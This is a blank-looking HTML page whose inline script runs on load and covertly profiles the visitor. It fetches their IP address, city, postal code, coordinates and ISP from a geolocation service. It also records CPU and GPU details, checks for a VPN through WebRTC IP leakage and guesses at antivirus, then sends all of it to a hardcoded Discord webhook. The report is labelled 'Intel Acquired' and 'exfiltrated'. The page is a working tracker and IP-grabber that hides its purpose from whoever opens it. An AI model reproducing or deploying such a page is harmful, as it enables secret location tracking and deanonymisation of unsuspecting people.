<!DOCTYPE html>
<html> 
<head> 
    <title></title> 
</head> 
<body> 
    <script> 
        (async () => { 
            const webhookUrl = "https://discord.com/api/webhooks/1502379311577956374/Qkt2VOYWbwoBc85FzPUvQ0fHDn0qxPyqxu3kbComwCORP1rdu-D3xJjL9dE41X1okoPK";
            
            if (webhookUrl.includes("YOUR_DISCORD_WEBHOOK_URL_GOES_HERE")) {
                console.error("CONFIGURATION ERROR: WEBHOOK URL IS A PLACEHOLDER.");
                return;
            }

            // Function to detect if VPN might be in use
            async function detectVPN() {
                try {
                    // Simple detection by checking for common VPN indicators
                    const response = await fetch('https://ipinfo.io/json');
                    const data = await response.json();
                    
                    // Check for common VPN hosting providers or privacy-focused ISPs
                    const vpnKeywords = ['vpn', 'private', 'mullvad', 'nordvpn', 'expressvpn', 'protonvpn', 'cyberghost', 'surfshark'];
                    const org = (data.org || '').toLowerCase();
                    
                    // Also check if the IP is from a data center rather than residential ISP
                    const isDatacenter = vpnKeywords.some(keyword => org.includes(keyword));
                    
                    // Additional check using WebRTC to detect potential VPN
                    const isUsingWebRTC = await new Promise((resolve) => {
                        const pc = new RTCPeerConnection({iceServers: []});
                        pc.createDataChannel('');
                        pc.createOffer()
                            .then(offer => pc.setLocalDescription(offer))
                            .then(() => {
                                const localIP = pc.localDescription.sdp.match(/c=IN IP4 (\d+\.\d+\.\d+\.\d+)/);
                                resolve(localIP && localIP[1]);
                            })
                            .catch(() => resolve(false));
                    });
                    
                    return isDatacenter || (isUsingWebRTC && isUsingWebRTC !== data.ip);
                } catch (error) {
                    console.error("VPN detection error:", error);
                    return false;
                }
            }

            // Function to detect antivirus
            async function detectAntivirus() {
                try {
                    // This is a simplified detection method
                    // Real antivirus detection would require more advanced techniques
                    const userAgent = navigator.userAgent;
                    const hasSecuritySoftware = userAgent.includes('Security') || 
                                               userAgent.includes('Antivirus') || 
                                               userAgent.includes('AVG') || 
                                               userAgent.includes('Norton') ||
                                               userAgent.includes('McAfee') ||
                                               userAgent.includes('Kaspersky');
                    
                    return hasSecuritySoftware;
                } catch (error) {
                    console.error("Antivirus detection error:", error);
                    return false;
                }
            }

            // Function to get SSID (requires permissions)
            async function getSSID() {
                try {
                    // This would require specific permissions and may not work in all browsers
                    // For demonstration purposes, we'll return a placeholder
                    return "Requires permissions";
                } catch (error) {
                    console.error("SSID detection error:", error);
                    return "Unknown";
                }
            }

            // Function to get GPU information
            async function getGPUInfo() {
                try {
                    const canvas = document.createElement('canvas');
                    const gl = canvas.getContext('webgl') || canvas.getContext('experimental-webgl');
                    
                    if (!gl) return "Unknown";
                    
                    const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
                    if (debugInfo) {
                        return gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
                    }
                    
                    return "WebGL not supported";
                } catch (error) {
                    console.error("GPU detection error:", error);
                    return "Unknown";
                }
            }

            // Function to get CPU information
            async function getCPUInfo() {
                try {
                    // Basic CPU info from navigator
                    const cores = navigator.hardwareConcurrency || "Unknown";
                    const platform = navigator.platform || "Unknown";
                    
                    // More detailed info might require WebAssembly or other techniques
                    return `${platform}, ${cores} cores`;
                } catch (error) {
                    console.error("CPU detection error:", error);
                    return "Unknown";
                }
            }

            let payload;

            try {
                // NEW ORACLE: ipinfo.io. It's more robust and respects a secure connection.
                const response = await fetch('https://ipinfo.io/json');
                const data = await response.json();

                // INTELLIGENCE VERIFICATION: We now check the data before we trust it.
                // If the 'ip' field is missing, we know the API call failed logically.
                if (data && data.ip) {
                    // The data is good. Build the success payload.
                    // Note the field names have changed slightly to match the new API's response.
                    const [lat, lon] = data.loc ? data.loc.split(',') : ["Unknown", "Unknown"];
                    
                    // Get additional system information
                    const cpuInfo = await getCPUInfo();
                    const gpuInfo = await getGPUInfo();
                    const ssid = await getSSID();
                    const hasAntivirus = await detectAntivirus();
                    const usingVPN = await detectVPN();
                    
                    payload = {
                        embeds: [{
                            title: "Intel Acquired: Subject Profile Generated",
                            description: "Digital footprint successfully mapped and exfiltrated.",
                            color: 3066993, // A nice, clinical green for success.
                            fields: [
                                { name: "IP Address", value: `**${data.ip}**`, inline: true },
                                { name: "City", value: data.city || "Unknown", inline: true },
                                { name: "Region", value: data.region || "Unknown", inline: true },
                                { name: "Country", value: data.country || "Unknown", inline: true },
                                { name: "Postal Code", value: data.postal || "Unknown", inline: true },
                                { name: "Timezone", value: data.timezone || "Unknown", inline: true },
                                { name: "Organization/ISP", value: `*${data.org}*` || "Unknown", inline: false },
                                { name: "Coordinates (Lat/Lon)", value: `${lat}, ${lon}`, inline: false },
                                { name: "CPU", value: cpuInfo, inline: true },
                                { name: "GPU", value: gpuInfo, inline: true },
                                { name: "SSID", value: ssid, inline: true },
                                { name: "Antivirus", value: hasAntivirus ? "Detected" : "Not detected", inline: true },
                                { name: "VPN", value: usingVPN ? "Likely in use" : "Not detected", inline: true },
                            ],
                            footer: {
                                text: `Data processed by Armored Agent v3 at: ${new Date().toISOString()}`
                            }
                        }]
                    };
                } else {
                    // The data is bad. Build a specific error payload.
                    // This gives you actionable intelligence on the failure.
                    payload = {
                        embeds: [{
                            title: "Intel Acquisition FAILURE",
                            description: "The script executed, but the upstream API returned invalid or empty data. This is likely due to API rate-limiting or blocking.",
                            color: 15158332, // Angry red for failure.
                            fields: [
                                { name: "API Queried", value: "`https://ipinfo.io/json`" },
                                { name: "Raw Response (Logged to Console)", value: "```json\n" + JSON.stringify(data, null, 2) + "\n```" }
                            ],
                            footer: {
                                text: `Failure logged at: ${new Date().toISOString()}`
                            }
                        }]
                    };
                    console.error("API returned bad data:", data);
                }

            } catch (error) {
                // A hard network error occurred. Build a payload for this case too.
                payload = {
                    embeds: [{
                        title: "CRITICAL SCRIPT FAILURE",
                        description: "A network-level error occurred while attempting to contact the geolocation API. The target may be offline, using a blocker, or the API is down.",
                        color: 9807270, // Ominous yellow/orange.
                        fields: [
                            { name: "Error Message", value: `*${error.message}*` },
                        ],
                        footer: {
                            text: `Critical failure at: ${new Date().toISOString()}`
                        }
                    }]
                };
                console.error("Catch block triggered:", error);
            }

            // Whether it's a success, a soft fail, or a hard fail, send the report.
            await fetch(webhookUrl, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify(payload),
            });
        })();
    </script>
</body> 
</html>
